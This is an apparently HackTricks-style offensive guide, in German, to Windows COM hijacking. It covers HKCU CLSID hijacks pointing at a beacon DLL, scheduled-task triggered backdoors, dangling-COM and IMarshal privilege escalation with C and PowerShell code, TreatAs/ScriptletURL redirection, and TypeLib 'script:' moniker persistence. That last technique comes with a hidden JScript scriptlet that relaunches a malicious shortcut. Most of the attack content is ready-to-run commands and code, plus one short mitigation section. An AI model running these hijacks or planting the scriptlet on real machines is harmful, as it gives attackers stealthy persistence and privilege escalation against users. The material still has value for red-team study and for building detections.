# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Nach nicht vorhandenen COM-Komponenten suchen

Da die Werte unter HKCU von Benutzern geändert werden können, lässt sich **COM Hijacking** als **Persistenzmechanismus** einsetzen. Mit `procmon` lassen sich einfach gesuchte COM-Registrierungen finden, die noch nicht existieren und von einem Angreifer erstellt werden könnten. Klassische Filter:

- **RegOpenKey**-Operationen.
- bei denen das _Result_ **NAME NOT FOUND** lautet.
- und der _Path_ mit **InprocServer32** endet.

Nützliche Varianten bei der Suche:

- Suche auch nach fehlenden **`LocalServer32`**-Schlüsseln. Einige COM-Klassen sind Out-of-Process-Server und starten statt einer DLL eine vom Angreifer kontrollierte EXE.
- Suche zusätzlich zu `InprocServer32` nach Registry-Operationen für **`TreatAs`** und **`ScriptletURL`**. In aktuellen Erkennungsregeln und Malware-Analysen werden diese immer wieder erwähnt, da sie viel seltener als normale COM-Registrierungen und daher besonders aussagekräftig sind.
- Übernimm beim Klonen einer Registrierung in HKCU den legitimen **`ThreadingModel`** aus dem ursprünglichen `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Ein falsches Modell verhindert oft die Aktivierung und macht den Hijack auffällig.<sup>[[3]](#references)</sup>
- Überprüfe auf 64-Bit-Systemen sowohl die 64-Bit- als auch die 32-Bit-Ansicht (`procmon.exe` vs. `procmon64.exe`, `HKLM\Software\Classes` und `HKLM\Software\Classes\WOW6432Node`), da 32-Bit-Anwendungen möglicherweise eine andere COM-Registrierung auflösen.

Nachdem du dich für die Nachahmung einer nicht vorhandenen COM-Komponente entschieden hast, führe die folgenden Befehle aus. _Sei vorsichtig, wenn du eine COM-Komponente nachahmen willst, die alle paar Sekunden geladen wird, da das übertrieben sein könnte._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Hijackbare Task Scheduler-COM-Komponenten

Windows-Aufgaben verwenden Custom Triggers, um COM-Objekte aufzurufen. Da diese über den Task Scheduler ausgeführt werden, lässt sich leichter vorhersagen, wann sie ausgelöst werden.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Anhand der Ausgabe können Sie beispielsweise eine Aufgabe auswählen, die **bei jeder Benutzeranmeldung** ausgeführt wird.

Wenn Sie nun in **HKEY\CLASSES\ROOT\CLSID** sowie in HKLM und HKCU nach der CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** suchen, werden Sie normalerweise feststellen, dass der Wert in HKCU nicht existiert.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Dann kannst du einfach den HKCU-Eintrag erstellen, und jedes Mal, wenn sich der Benutzer anmeldet, wird deine Backdoor ausgelöst.

## Verwaiste COM-Registrierungen und Custom Marshaling

Eine systemweite COM-Registrierung kann zu einer DLL-planting-Möglichkeit werden, ohne dass die Registry geändert werden muss. Suche nach einem `InprocServer32`-Wert, dessen DLL fehlt und dessen endgültiger Pfad von einem Benutzer mit niedrigen Berechtigungen erstellt oder geändert werden kann. Wenn du eine DLL mit exakt diesem Namen platzierst, lädt jeder Prozess, der die CLSID aktiviert, den Code des Angreifers. Im CrossDevice-Beispiel lautete der registrierte Pfad `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, sodass ein Standardbenutzer das fehlende Unterverzeichnis und die DLL erstellen konnte.<sup>[[5]](#references)</sup>

### Beschreibbare Plugin-Zuordnungen als privilegierte COM-Aktivierungspfade

Eine beschreibbare Zuordnung von Plugin-IDs zu CLSIDs kann es einem Benutzer mit niedrigeren Berechtigungen ermöglichen, auszuwählen, welchen prozessinternen COM-Server ein privilegierter Dienst lädt, selbst wenn die systemweite Registrierung der Klasse nicht bearbeitet werden kann.<sup>[[8]](#references)[[9]](#references)</sup> Im gemeldeten Windows-11-Fall mit `InstallService` konnten Standardbenutzer `StaticPluginMap` ändern; eine nicht integrierte Plugin-ID wählte eine CLSID aus, die der `LocalSystem`-Dienst mit `CLSCTX_INPROC_SERVER` und `IID_IInstallServicePlugin` an `CoCreateInstance` übergab.<sup>[[8]](#references)[[9]](#references)</sup> Die registrierte DLL wird in den Dienstprozess geladen und nicht in einen separaten COM-Host.<sup>[[10]](#references)</sup>

Zu den relevanten Bedingungen gehören effektiver Schreibzugriff auf die Zuordnung, eine erreichbare Plugin-Anforderung und ein `InprocServer32`-DLL-Pfad, den der Benutzer mit niedrigeren Berechtigungen kontrollieren kann.<sup>[[8]](#references)[[9]](#references)</sup> Die oben genannte CrossDevice-Registrierung erfüllte im gemeldeten Fall die Pfadbedingung.<sup>[[8]](#references)[[9]](#references)</sup> Ein erfolgreiches Plugin-Objekt muss die angeforderte Schnittstelle bereitstellen, aber die DLL wird geladen, bevor `CoCreateInstance` abgeschlossen ist; wenn die Schnittstelle nicht bereitgestellt wird, schließt das allein eine Codeausführung während des Ladens nicht aus.<sup>[[8]](#references)[[11]](#references)</sup> Dieser Dienst-Dispatch-Pfad unterscheidet sich vom weiter unten beschriebenen Pfad über benutzerdefiniertes `IMarshal`. Für die separate Dateipfad-Möglichkeit siehe [DLL Hijacking](dll-hijacking/).

### `IMarshal` als prozessübergreifende DLL-Lademöglichkeit

COM stellt einen Schnittstellenzeiger normalerweise mit einem standardmäßigen `OBJREF` dar, das den Empfänger auf das ursprüngliche Objekt verweist. Ein Objekt, das `IMarshal` implementiert, kann stattdessen ein benutzerdefiniertes `OBJREF` erzeugen. Seine Methode `GetUnmarshalClass` liefert die CLSID des Codes, der das Objekt im empfangenden Prozess rekonstruiert. Diese CLSID muss nicht das ursprüngliche Objekt bezeichnen. COM löst sie als prozessinternen Server auf und lädt die registrierte DLL, bevor die angeforderte Schnittstellenmethode aufgerufen wird.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Eine minimale bösartige Implementierung muss in `GetUnmarshalClass` lediglich die verwaiste CLSID einsetzen.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Übergeben Sie dieses Objekt über einen proxied Methodenparameter, etwa einen `[in] IUnknown *`. Eine weitere Möglichkeit ist `CoGetInstanceFromIStorage`, wobei das custom-marshaled Objekt zusätzlich genug von `IStorage` implementiert, um die lokalen Prüfungen zu bestehen. Das automatische Unmarshaling im Remote-Server löst die ersetzte CLSID auf, sodass die DLL geladen wird, bevor die Zielmethode ausgeführt wird.<sup>[[5]](#references)</sup>

Das Primitive ist nicht auf fehlende Registrierungen beschränkt. Es kann den Empfänger auch dazu zwingen, eine vorhandene Custom-Unmarshaler-DLL zu laden und Fehler in deren Lade- oder Unmarshaling-Pfad aufzudecken.<sup>[[5]](#references)</sup>

Die Kette setzt alle folgenden Bedingungen voraus:<sup>[[5]](#references)</sup>

1. Eine maschinenweit sichtbare CLSID verweist auf eine fehlende oder ersetzbare In-Process-DLL.
2. Der Angreifer kann diese DLL im aufgelösten Pfad ablegen.
3. Ein aktivierbarer Out-of-Process-COM-Server läuft mit der gewünschten Berechtigungsstufe.
4. Der Server akzeptiert Custom Marshaling und stellt einen proxied Aufruf bereit, der das Angreiferobjekt über die Prozessgrenze hinweg überträgt.

### Verwaiste In-Process-Server finden

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) und [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) können die maschinenweite COM-Datenbank aufzählen und jeden Server mithilfe der normalen Win32-Modulauflösung testen. Das ist `Test-Path` vorzuziehen, da manche Registrierungen nur einen Dateinamen enthalten und sich auf den Loader-Suchpfad verlassen.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Behandle das Ergebnis als Kandidatenliste, nicht als Beweis für Ausnutzbarkeit. Löse den Pfad so auf, wie es der Loader tut, und prüfe dann die DACL des ersten vorhandenen übergeordneten Verzeichnisses sowie der vorgesehenen DLL, falls sie bereits existiert. Eine fehlende Datei ist nur dann relevant, wenn der Angreifer den Pfad erstellen oder ersetzen kann, den COM tatsächlich auflösen wird.<sup>[[5]](#references)</sup>

### Einen privilegierten Empfänger auswählen und starten

Untersuche mögliche COM-Klassen auf `RunAs`, Dienstzuordnung, verfügbare Schnittstellen und RPC-Proxys. Eine für `SYSTEM` konfigurierte Klasse, hinter der kein benannter Dienst steht, kann bei direkter Aktivierung fehlschlagen, da RPCSS sie nicht starten kann. Suche in diesem Fall nach einem nicht privilegierten Auslöser, der ihren Host startet, etwa einer ausführbaren geplanten Aufgabe, und erfülle alle erforderlichen Named-Event- oder IPC-Voraussetzungen, durch die der Server aktiv bleibt.<sup>[[5]](#references)</sup>

Beispielsweise startete die anfällige Shell-Create-Object-Handler-Kette ihren Host, indem sie das erwartete globale Event erstellte, bevor sie eine vom Benutzer ausführbare geplante Aufgabe aufrief.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Ordne die resultierende Objektreferenz ihrem Host zu und überprüfe sowohl die Identität als auch die Marshaling-Richtlinie. Zähle dann die Schnittstellen auf und wandle ihre Proxys in IDL um, um einen Eingabeparameter wie `IUnknown *` zu finden, der das gefälschte Objekt marshallen kann.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Schutzmaßnahmen für Custom Marshaling

Ein geeigneter Empfänger darf nicht vertrauenswürdige Custom Marshaler nicht ablehnen. Zwei prozessweite Schutzmaßnahmen sind `EOAC_NO_CUSTOM_MARSHAL` in den an `CoInitializeSecurity` übergebenen Capabilities und `COMGLB_UNMARSHALING_POLICY_STRONG`, gesetzt über `IGlobalOptions::Set`. Mit Symbolen lässt sich der entsprechende Zustand in `combase!gCapabilities` und `combase!g_GLBOPT_UnmarshalingPolicy` prüfen; NtObjectManager stellt das Ergebnis als `CustomMarshalAllowed` bereit, sofern sein Prozessparser den Windows-Build unterstützt.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` ermöglicht, dass eine CLSID durch eine andere emuliert wird.<sup>[[4]](#references)</sup> Aus offensiver Sicht bedeutet das, dass du die ursprüngliche CLSID unverändert lassen, eine zweite CLSID pro Benutzer erstellen kannst, die auf `scrobj.dll` verweist, und dann das echte COM-Objekt mit `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` auf das bösartige Objekt umleiten kannst.

Das ist nützlich, wenn:

- die Zielanwendung beim Anmelden oder Starten der Anwendung bereits eine stabile CLSID instanziiert
- du eine Umleitung ausschließlich über die Registry möchtest, statt das ursprüngliche `InprocServer32` zu ersetzen
- du über den Wert `ScriptletURL` ein lokales oder remote gespeichertes `.sct`-Scriptlet ausführen möchtest

Beispiel-Workflow (angepasst aus der öffentlichen Atomic Red Team Tradecraft und älterer Forschung zum Missbrauch der COM-Registry):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notes:

- `scrobj.dll` liest den Wert `ScriptletURL` und führt die referenzierte `.sct` aus. Daher können Sie die Payload als lokale Datei bereitstellen oder sie per HTTP/HTTPS remote abrufen.
- `TreatAs` ist besonders nützlich, wenn die ursprüngliche COM-Registrierung in HKLM vollständig und stabil ist, da Sie dann nur eine kleine benutzerspezifische Umleitung statt des gesamten Baums spiegeln müssen.
- Um die Funktion zu überprüfen, ohne auf den natürlichen Trigger zu warten, können Sie die gefälschte ProgID/CLSID manuell mit `rundll32.exe -sta <ProgID-or-CLSID>` instanziieren, sofern die Zielklasse STA-Aktivierung unterstützt.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definieren COM-Schnittstellen und werden über `LoadTypeLib()` geladen. Wenn ein COM-Server instanziiert wird, lädt das Betriebssystem möglicherweise auch die zugehörige TypeLib, indem es Registrierungsschlüssel unter `HKCR\TypeLib\{LIBID}` abfragt. Wird der Pfad der TypeLib durch einen **moniker** ersetzt, z. B. `script:C:\...\evil.sct`, führt Windows das Scriptlet aus, wenn die TypeLib aufgelöst wird – so entsteht eine unauffällige Persistenz, die ausgelöst wird, wenn gängige Komponenten verwendet werden.

Dies wurde beim Microsoft Web Browser Control beobachtet (das häufig von Internet Explorer, Apps mit eingebettetem WebBrowser und sogar `explorer.exe` geladen wird).<sup>[[1]](#references)[[2]](#references)</sup>

### Schritte (PowerShell)

1) Identifizieren Sie die von einer häufig verwendeten CLSID genutzte TypeLib (LIBID). Beispiel für eine CLSID, die häufig von Malware-Ketten missbraucht wird: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Verweisen Sie den benutzerspezifischen TypeLib-Pfad mithilfe des `script:`-Monikers auf ein lokales Scriptlet (keine Administratorrechte erforderlich):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Platziere ein minimales JScript-`.sct`, das dein primäres Payload erneut startet (z. B. eine `.lnk`, die in der initialen Kette verwendet wird):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Auslösen – das Öffnen von IE, einer Anwendung, die das WebBrowser-Steuerelement einbettet, oder sogar routinemäßige Explorer-Aktivität lädt die TypeLib und führt das Scriptlet aus, wodurch deine Chain bei der Anmeldung/beim Neustart erneut aktiviert wird.

Bereinigung
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notes
- Dieselbe Logik lässt sich auf andere häufig verwendete COM-Komponenten anwenden. Ermittle zuerst immer die tatsächliche `LIBID` unter `HKCR\CLSID\{CLSID}\TypeLib`.
- Auf 64-Bit-Systemen kannst du auch den Unterschlüssel `win64` für 64-Bit-Consumer anlegen.

## References

- [1] [Die TypeLib hijacken – Neue COM-Persistenztechnik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine-Kampagne: Ein ausgeklügelter Phishing-Angriff auf US-Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM-Hijacking neu betrachtet (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID-Schlüssel (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero – Windows-Exploitation-Techniken: Verwaiste COM-Objektregistrierungen](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn – IMarshal-Schnittstelle](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications – MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [Dark Elevator PoC und technischer Bericht (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: Lokale Rechteausweitung über den Windows-Installationsdienst (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [CLSCTX-Aufzählung (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [CoCreateInstance-Funktion (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

